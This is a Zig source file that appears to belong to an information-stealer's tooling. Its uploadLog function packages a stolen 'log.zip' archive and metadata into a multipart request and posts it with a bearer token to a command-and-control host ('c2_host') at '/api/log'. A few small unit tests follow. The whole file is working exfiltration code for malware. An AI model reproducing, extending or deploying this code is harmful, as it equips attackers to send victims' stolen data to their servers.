const std = @import("std");
const http = @import("http.zig");

pub const PanelError = error{
    UploadFailed,
    InvalidResponse,
    ApiError,
};

pub fn uploadLog(
    allocator: std.mem.Allocator,
    c2_host: []const u8,
    c2_port: u16,
    token: []const u8,
    archive_data: []const u8,
    metadata: []const u8,
) !void {
    const boundary = "----MiragePanelBoundary8MA4YWxkTrZu0gX";

    var body = try std.ArrayList(u8).initCapacity(allocator, 4096);
    defer body.deinit(allocator);

    try body.appendSlice(allocator, "--");
    try body.appendSlice(allocator, boundary);
    try body.appendSlice(allocator, "\r\n");
    try body.appendSlice(allocator, "Content-Disposition: form-data; name=\"archive\"; filename=\"log.zip\"\r\n");
    try body.appendSlice(allocator, "Content-Type: application/octet-stream\r\n\r\n");
    try body.appendSlice(allocator, archive_data);
    try body.appendSlice(allocator, "\r\n");

    try body.appendSlice(allocator, "--");
    try body.appendSlice(allocator, boundary);
    try body.appendSlice(allocator, "\r\n");
    try body.appendSlice(allocator, "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n");
    try body.appendSlice(allocator, metadata);
    try body.appendSlice(allocator, "\r\n");

    try body.appendSlice(allocator, "--");
    try body.appendSlice(allocator, boundary);
    try body.appendSlice(allocator, "--\r\n");

    var auth_header_buf: [512]u8 = undefined;
    const auth_header = try std.fmt.bufPrint(&auth_header_buf, "Bearer {s}", .{token});

    var client = http.HttpClient.connect(c2_host, c2_port) catch return error.UploadFailed;
    defer client.close();

    const headers = [_]http.Header{
        .{ .name = "Authorization", .value = auth_header },
    };

    const resp = client.postMultipart("/api/log", &headers, boundary, body.items) catch return error.UploadFailed;
    defer resp.deinit();

    if (resp.status != 200) return error.ApiError;
}

test "uploadLog auth header format" {
    var buf: [512]u8 = undefined;
    const token = "test-token-123";
    const auth = try std.fmt.bufPrint(&buf, "Bearer {s}", .{token});
    try std.testing.expectEqualStrings("Bearer test-token-123", auth);
}

test "uploadLog parameter types" {
    try std.testing.expect(@TypeOf(uploadLog) == fn (
        std.mem.Allocator,
        []const u8,
        u16,
        []const u8,
        []const u8,
        []const u8,
    ) anyerror!void);
}

test "multipart boundary format" {
    const boundary = "----MiragePanelBoundary8MA4YWxkTrZu0gX";
    try std.testing.expect(boundary.len > 10);
}
